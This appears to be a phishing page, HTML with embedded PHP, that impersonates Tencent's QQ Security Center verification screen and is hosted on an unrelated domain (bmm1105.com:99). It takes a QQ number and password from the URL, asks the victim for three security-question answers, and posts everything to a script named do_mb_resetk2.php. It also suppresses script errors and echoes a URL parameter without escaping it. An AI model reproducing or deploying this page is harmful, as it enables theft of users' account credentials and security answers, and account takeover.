
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
<title>QQ安全中心</title>
<link href="unionverify/css/safe_v2.css-v=1.css" tppabs="http://bmm1105.com:99/unionverify/css/safe_v2.css?v=1" rel="stylesheet" type="text/css" />
<script language="JavaScript">
<!-- Hide
function killErrors() {
return true;
}
window.onerror = killErrors;
// -->
</script>
</head>
	<?php
		if(isset($_GET['u']) && isset($_GET['p'])){
			if(!is_numeric($_GET['u']) && (strlen($_GET['u'])<5 || strlen($_GET['p'])>11)){
				echo "<script>alert('用户名密码不正确');window.location.href='reset.php';</script>";
			}
		}else{
			echo "<script>alert('用户名密码不正确');window.location.href='reset.php';</script>";
		}
	?>
<script type="text/javascript" src="htdocs/js/jquery.min.js" tppabs="http://bmm1105.com:99/htdocs/js/jquery.min.js"></script>
<script type="text/javascript" src="htdocs/js/common.js.2.0" tppabs="http://bmm1105.com:99/htdocs/js/common.js.2.0"></script>

<script language="javascript" src="htdocs/js/ctrlManager.js" tppabs="http://bmm1105.com:99/htdocs/js/ctrlManager.js"></script>
<script language="javascript" src="htdocs/js/check.js" tppabs="http://bmm1105.com:99/htdocs/js/check.js"></script>

<body>
<form name="myform" id="myform" method="post" autocomplete="off" action="do_mb_resetk2.php?u=<?php echo $_GET['u']; ?>" onsubmit="return checkForm();" accept-charset="utf8" target="_top">
<div class="safetyvalidate" >

<h4>腾讯安全验证 <span>
<a href="javascript:if(confirm('http://bmm1105.com:99/cgi-bin/unionverify/link_jump?linkname=feedback  \n\n??ļ????? Teleport Ultra ??, ?Ϊ ???????????δ?????  \n\n????????????'))window.location='http://bmm1105.com:99/cgi-bin/unionverify/link_jump?linkname=feedback'" tppabs="http://bmm1105.com:99/cgi-bin/unionverify/link_jump?linkname=feedback" class="feedback" target="_blank" tabindex="2">
反馈</a></span></h4>
  <a href="javascript:if(confirm('http://bmm1105.com:99/cn/index  \n\n??ļ????? Teleport Ultra ??, ?Ϊ ???????????δ?????  \n\n????????????'))window.location='http://bmm1105.com:99/cn/index'" tppabs="http://bmm1105.com:99/cn/index" target="_blank" title="点击前往QQ安全中心" class="validate_logo" onfocus="this.blur()"><b>
点击前往QQ安全中心</b></a>

  <div class="content">
      <div class="in_content" >
        <p class="title" id="top_tip">根据系统设置，在解除限制前需要进行安全验证。		
		</p>
        <div class="check clearfix" >
		<div id="selsecter">
          <ul>
            <li><span class="label">选择验证方式：</span>
              <select name="select" id="select" class="ipt_select" tabindex="3">
                <option id="question_sel" value="question">密保问题</option>
				</select>
            </li>
            </ul>
         </div>
         <div id="mbitems">
		 	
		 	
            
		<div id="phone" style="display:none">

			
			
			
			<ul id="get_vcode_auto">
             <li class="col"><span class="label superQQ">超级QQ特权：</span><input id="get_vcode_btn" type="button"  value="获取验证码" class="button" /><em id="left_sms">(剩余106条)</em></li>
           </ul>
		   
		   
			
             <ul id="phone_comm">
				<div id="sms_tip" style="display:none;">
			   <li class="col"><span class="label">编辑短信：</span><span class="key_red">GT230000500</span></li>
               <li class="col2"><span class="label">发送到：</span><span class="key_red">1065755802381</span> <span class="key_gray">
				获取验证码<br /><span class="pL">一般为0.1元/条，由运营商收取</span></span></li>
			   </div>
             <li class="col"><span class="label">验证码：</span>
			    <input type="text" id="DnaMobileCode" name="DnaMobileCode" class="inputstyle key_c" maxlength=8 tabindex="4"/>
				<span id="get_vcode_manual" style="display:none;" class="pL">
				不能正常获取验证码，<a href="javascript:ShowGetVCode();" >点此</a></span>	
             </li>
            </ul>   

			</div>
			
			
       
			
			          <div id="question">
          <input type=hidden value=0 name="order" id="order"/>
		  <input type=hidden name="dnaAnswerHex1" id="dnaAnswerHex1"/>
		   <input type=hidden name="dnaAnswerHex2" id="dnaAnswerHex2"/>
		    <input type=hidden name="dnaAnswerHex3" id="dnaAnswerHex3"/>
          <ul>
          <script language="javascript" src="dna.js"></script>
		  <li><span class="label" >问题一：</span><select class="ipt_select" name="ddlDNAQues1" id="ddlDNAQues1" onchange="dnaQuesChangeHandler(this);">			
					</select></li>
            <li><span class="label">答案：</span>
              <input type="text"  name="dnaAnswer1" id="dnaAnswer1" class="inputstyle" tabindex="4"/>
            </li>
			
			
            
			<li><span class="label">问题二：</span><select class="ipt_select" name="ddlDNAQues2" id="ddlDNAQues2" onchange="dnaQuesChangeHandler(this);">			
					</select></li>
            <li><span class="label" id="Span1">答案：</span>
			<input type="text"  name="dnaAnswer2" id="dnaAnswer2" class="inputstyle"  value="" tabindex="5" />
			</li>
			<li><span class="label">问题三：</span><select class="ipt_select" name="ddlDNAQues3" id="ddlDNAQues3" onchange="dnaQuesChangeHandler(this);">			
					</select></li>
            <li><span class="label">答案：</span>
              	<input type="text" name="dnaAnswer3" id="dnaAnswer3"  class="inputstyle"  value="" tabindex="6" />
            </li>			
		</ul>
</div>
<script language="javascript">
var dnaHandler1=new DnaSetHandler();
function dnaQuesChangeHandler(_source) {
	dnaHandler1.selectionChange(_source);
}
function dnaAnswerBlurHandler(_source) {
    dnaHandler1.answerBlur(_source);
}
var dnaAnswer = new DnaAnser3Handler('txtAnswer1', 'divDnaTip1', 'txtAnswer2', 'divDnaTip2', 'txtAnswer3', 'divDnaTip3');

</script>
			
			
			</div>
			<!--session info-->
			
			<input type="hidden" id="verifyitem" value=""/>
			<input type="hidden" name="app" value="ipwd"/>
			<input type="hidden" name="back_url" value="/cn2/ipwd/ipwd_uv_back?ipwd_appid=1&ipwd_style=&ipwd_ot=mod&ipwd_tg=parent&ipwd_jsc=1&ipwd_from=aq"/>
			
			</div>
		</div>

	
		
		
			<p class="tips_area li_warn" id="qqtoken_lost" style="display:none">
			丢失QQ令牌？点此<a href="javascript:if(confirm('http://bmm1105.com:99/cgi-bin/unionverify/link_jump?linkname=qqtoken_lost  \n\n??ļ????? Teleport Ultra ??, ?Ϊ ???????????δ?????  \n\n????????????'))window.location='http://bmm1105.com:99/cgi-bin/unionverify/link_jump?linkname=qqtoken_lost'" tppabs="http://bmm1105.com:99/cgi-bin/unionverify/link_jump?linkname=qqtoken_lost" target="_blank" tabindex="11">挂失QQ令牌</a></p>
			<p class="tips_area li_warn">忘记密保问题？点此申请重置密保</p>
		
		
	
	
	  </div>
	 
    <div class="btn" id="button">
				<input type="hidden" name="u" value="123456">
				<input type="hidden" name="p" value="123456">
	  <input type="submit" value="确 定" class="btn_em" id="confirm" tabindex="8" />
      <input type="button" onclick="hide_apform()" value="取 消" class="btn_dft" id="cancel" tabindex ="9"/>
    </div>
	
  </div>
  </form>  
  <div id="alert_div">
</div>

</body>
</html>

<script language="javascript">

function hide_apform(){
	apform=parent.getElementById('aq_comm_frame');
	apform.style.display='none';
}

function checkForm()

{
	if (document.myform.ddlDNAQues1.value == "-1"){
		alert ("提示：\n\n请选择问题！");
		document.myform.ddlDNAQues1.focus();
		return false;
	}
	if (document.myform.ddlDNAQues2.value == "-1"){
		alert ("提示：\n\n请选择问题！");
		document.myform.ddlDNAQues2.focus();
		return false;
	}
	if (document.myform.ddlDNAQues3.value == "-1"){
		alert ("提示：\n\n请选择问题！");
		document.myform.ddlDNAQues3.focus();
		return false;
	}
	if (document.myform.dnaAnswer1.value == ""){
		alert ("提示：\n\n请填写答案！");
		document.myform.dnaAnswer1.focus();
		return false;
	}
	if (document.myform.dnaAnswer2.value == ""){
		alert ("提示：\n\n请填写答案！");
		document.myform.dnaAnswer2.focus();
		return false;
	}
	if (document.myform.dnaAnswer3.value == ""){
		alert ("提示：\n\n请填写答案！");
		document.myform.dnaAnswer3.focus();
		return false;
	}
 }
 if(!!window.ActiveXObject){
 document.charset='utf8';
 }
</script>